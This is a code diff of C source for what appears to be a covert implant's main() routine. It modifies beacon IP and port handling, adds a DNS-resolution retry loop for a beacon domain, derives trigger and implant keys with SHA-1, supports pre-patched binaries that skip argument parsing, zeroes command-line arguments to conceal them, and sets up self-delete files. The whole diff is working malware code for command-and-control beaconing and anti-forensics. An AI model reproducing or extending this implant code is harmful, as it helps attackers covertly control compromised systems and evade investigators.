@@ -122,8 +122,8 @@ int main(int argc, char** argv)
 {
 	int				c = 0;
 	char			*beaconIP = NULL;
-	char			dns_ip[16];
-	struct in_addr	beaconIPaddr;
+	char			dns_ip[16] = {0};
+	uint32_t		beaconIPaddr;
 	char			*szInterface = NULL;
 	int				beaconPort = DEFAULT_BEACON_PORT;
 	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
@@ -200,7 +200,7 @@ int main(int argc, char** argv)
 		cl_string((unsigned char *)dns_ip, sizeof(dns_ip));
 		DLX(1, printf( "\tDecoded DNS server address: %s\n", dns_ip));
 
-		goto okay;
+		goto patched_binary;
 	}
 	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
 
@@ -269,10 +269,10 @@ int main(int argc, char** argv)
 						perror("Option K");
 						return -1;
 					}
-					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { // Validate that the key text is of sufficient length
-						sha1_file((const char *)optarg, ikey);		// Generate the ID key
+					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 			// Validate that the key text is of sufficient length
+						sha1_file((const char *)optarg, ikey);				// Generate the ID key
 						DLX(1, displaySha1Hash ("Trigger Key: ", ikey));
-						sha1(ikey, ID_KEY_HASH_SIZE, ikey);		// Generate the implant key
+						sha1(ikey, ID_KEY_HASH_SIZE, ikey);					// Generate the implant key
 						DLX(1, displaySha1Hash ("Implant Key: ", ikey));
 						DLX(1, printf("\n\n\n" ));
 					} else {
@@ -347,34 +347,47 @@ int main(int argc, char** argv)
 		}
 	}
 
-	// process environment variables, if needed
+	// Process environment variables, if needed
 	
-	//validate user input
-	//Make sure the beacon's port is specified
-	if (beaconPort == -1) {
-		DLX(1, printf("No Beacon Port Specified! \n"));
-		DLX(1, printUsage(argv[0]));
-	}
-
-	// Obtain Beacon IP address
-	if (beaconIP == NULL) {
-		DLX(1, printf("No Beacon IP address specified! \n"));
-		DLX(1, printUsage(argv[0]));
-		return 0;
-	}
-	if (inet_pton(AF_INET, beaconIP, &beaconIPaddr) == 0) {					// Determine if beacon IP is an address
-		beaconIPaddr = (in_addr_t)dns_resolv(beaconIP, dns_ip);		// If not, attempt a DNS lookup.
-	}
-
 	if (initialDelay > 0 && interval == 0 ) {
 		DLX(1, printf("No Beacon Interval specified!\n"));
 		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
 
+	//Make sure the beacon's port is specified
 	if  (initialDelay >= (INT_MAX-1)) {
 		DLX(1, printUsage(argv[0]));
 		return 0;
+	}
+
+	if (initialDelay > 0) {			// Beacons enabled
+		char	*resolved_beaconIP = NULL;
+
+		if (beaconPort == -1) {
+			DLX(1, printf("No Beacon Port Specified!\n"));
+			DLX(1, printUsage(argv[0]));
+		}
+
+		// Obtain Beacon IP address
+		if (beaconIP == NULL) {
+			DLX(1, printf("No Beacon IP address specified!\n"));
+			DLX(1, printUsage(argv[0]));
+			return 0;
+		}
+		if (inet_pton(AF_INET, beaconIP, &beaconIPaddr) == 0) {		// Determine if beacon IP is an address
+			if (dns_ip == NULL) {									// If not, attempt DNS lookup if DNS server was specified
+				DLX(1, printf("Beacon IP was specified as a domain name, but no DNS server was specified to resolve the name!\n"));
+				return -1;
+			}
+			while ((resolved_beaconIP = dns_resolv(beaconIP, dns_ip)) == NULL) {		// DNS lookup.
+				DLX(4, printf("Beacon IP address failed to resolve, sleeping for %i seconds.\n", interval/1000));
+				sleep(interval/1000);											// If resolution fails, retry every beacon interval.
+			}
+			memcpy(beaconIP, resolved_beaconIP, strlen(resolved_beaconIP)+1);	// Copy the resolved IP address along with terminating NULL byte
+			DLX(6, printf("Beacon IP: %s\n", beaconIP));
+			free(resolved_beaconIP);
+		}
 	}
 
 	//Make sure the jitter is non zero
@@ -388,11 +401,11 @@ int main(int argc, char** argv)
 		return 0;
 	}
 
-	// for Linux and Solaris, zeroize command line arguments
-	clean_args(argc, argv, NULL);
+	clean_args(argc, argv, NULL);	// Zero command line arguments
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-okay:	// if the binary has been patched, we don't need to parse command line arguments
+patched_binary:	// Parsing of command line arguments skipped for patched binaries
 
 	// Construct self delete control and log files with full path names
 	if (strlen((const char *)sdcfp) == 0) {
